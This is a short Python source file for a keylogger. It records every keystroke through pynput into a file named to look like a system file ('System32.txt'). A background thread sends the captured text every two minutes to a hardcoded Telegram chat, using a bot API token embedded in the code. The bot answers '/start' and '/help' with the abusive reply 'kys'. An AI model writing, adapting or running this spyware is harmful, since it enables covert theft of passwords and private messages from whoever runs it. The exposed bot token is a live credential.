import os
import time
import threading
import telebot
from pynput.keyboard import Key, Listener


API_TOKEN = '6582521140:AAFGEqmfH0NOg47egJBL17V6k2x8xDBYjOk'
file_path = "C:\\Pythons\\System\\System32.txt"

bot = telebot.TeleBot(API_TOKEN)


def on_key_press(key):
    with open(file_path, 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            if key == Key.space:
                logKey.write(" ")
            else:
                pass


os.makedirs(os.path.dirname(file_path), exist_ok=True)
key_listener = Listener(on_press=on_key_press)


def send_message_periodically():
    first_run = True
    while True:
        if not os.path.exists(file_path):
            with open(file_path, 'w') as start_file:
                start_file.write('start')
        with open(file_path, 'r') as file:
            try:
                file_contents = file.read()
                if first_run and not file_contents.strip():
                    with open(file_path, 'w') as start_file:
                        start_file.write('start')
                    first_run = False
                bot.send_message('5692953878', file_contents)

            except Exception as e:
                print('Error:', str(e))
        time.sleep(120)


message_thread = threading.Thread(target=send_message_periodically)
message_thread.start()


@bot.message_handler(commands=['help', 'start'])
def send_welcome(message):
    bot.reply_to(message, """\
kys
""")


@bot.message_handler(func=lambda message: True)
def echo_message(message):
    bot.reply_to(message, message.text)


key_listener.start()
bot.infinity_polling()
